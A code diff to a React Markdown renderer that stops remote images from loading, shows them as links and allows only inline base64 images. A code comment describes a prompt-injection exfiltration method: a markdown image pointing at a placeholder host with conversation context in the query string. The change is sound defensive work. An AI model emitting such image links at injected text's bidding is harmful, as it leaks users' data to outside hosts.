@@ -1,6 +1,7 @@
 import { Box, Code, Link, Table, Text } from "@chakra-ui/react";
 import { memo } from "react";
-import ReactMarkdown, { type Components } from "react-markdown";
+import { LuImage } from "react-icons/lu";
+import ReactMarkdown, { type Components, defaultUrlTransform } from "react-markdown";
 import remarkGfm from "remark-gfm";
 
 import { highlightLines } from "../../lib/highlight";
@@ -62,6 +63,26 @@ export function CodeBlock({ code, language }: { code: string; language?: string 
   );
 }
 
+/** Inline raster images the page may show: they carry their bytes, so nothing is fetched. */
+const INLINE_IMAGE = /^data:image\/(?:png|jpeg|gif|webp);base64,[a-z0-9+/=\s]+$/i;
+
+export function isInlineImage(src: string | undefined): boolean {
+  return !!src && INLINE_IMAGE.test(src);
+}
+
+/** react-markdown's sanitiser, plus inline raster `data:` images for `src`. */
+function urlTransform(url: string, key: string): string {
+  if (key === "src" && isInlineImage(url)) return url;
+  return defaultUrlTransform(url);
+}
+
+const linkProps = {
+  color: "blue.600",
+  _dark: { color: "blue.300" },
+  target: "_blank",
+  rel: "noopener noreferrer",
+} as const;
+
 const components: Components = {
   h1: ({ children }) => (
     <Text as="h1" fontSize="lg" fontWeight="bold" mt={3} mb={1.5}>
@@ -89,10 +110,25 @@ const components: Components = {
     </Text>
   ),
   a: ({ children, href }) => (
-    <Link href={href} color="blue.600" _dark={{ color: "blue.300" }} target="_blank" rel="noopener noreferrer">
+    <Link href={href} {...linkProps}>
       {children}
     </Link>
   ),
+  // Markdown here is often model output or fetched documentation: loading a remote image
+  // would send a request the reader never chose (prompt-injected `![](https://x/?q=<context>)`
+  // exfiltrates data through the URL). Remote images are shown as links instead.
+  img: ({ src, alt }) => {
+    const url = typeof src === "string" ? src : undefined;
+    if (isInlineImage(url)) return <img src={url} alt={alt ?? ""} style={{ maxWidth: "100%" }} />;
+    const label = alt?.trim() || url || "";
+    if (!url) return <>{label}</>;
+    return (
+      <Link href={url} {...linkProps} data-testid="markdown-image-link" title={url}>
+        <LuImage style={{ display: "inline", verticalAlign: "-0.125em", marginInlineEnd: "0.25em" }} aria-hidden />
+        {label}
+      </Link>
+    );
+  },
   ul: ({ children }) => (
     <Box as="ul" ps={5} my={1.5} fontSize="sm" listStyleType="disc">
       {children}
@@ -142,12 +178,13 @@ const components: Components = {
 
 /**
  * GitHub-flavoured Markdown, rendered without raw HTML (react-markdown escapes it and
- * sanitises link URLs), so user-written docs are safe to preview.
+ * sanitises link URLs), so user-written docs are safe to preview. Remote images are never
+ * loaded (they become links), so model output cannot make the browser call a URL.
  */
 export const Markdown = memo(function Markdown({ text }: { text: string }) {
   return (
     <Box className="autoair-markdown" fontSize="sm" wordBreak="break-word" data-testid="markdown-preview">
-      <ReactMarkdown remarkPlugins={[remarkGfm]} components={components}>
+      <ReactMarkdown remarkPlugins={[remarkGfm]} components={components} urlTransform={urlTransform}>
         {text}
       </ReactMarkdown>
     </Box>
